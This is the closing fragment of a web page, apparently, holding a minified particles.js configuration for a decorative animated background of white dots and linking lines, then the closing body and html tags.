<script>particlesJS("particles-js",{particles:{number:{value:80,density:{enable:!0,value_area:1e3}},color:{value:"#ffffff"},shape:{type:"circle",stroke:{width:0,color:"#000000"}},opacity:{value:.5,random:!1,anim:{enable:!1,speed:1,opacity_min:.1,sync:!1}},size:{value:2,random:!0,anim:{enable:!1,speed:4,size_min:.1,sync:!1}},line_linked:{enable:!0,distance:150,color:"#ffffff",opacity:.3,width:1},move:{enable:!0,speed:.5,direction:"none",random:!0,straight:!1,out_mode:"out",bounce:!1,attract:{enable:!1,rotateX:600,rotateY:1200}}},retina_detect:!0})</script></body></html>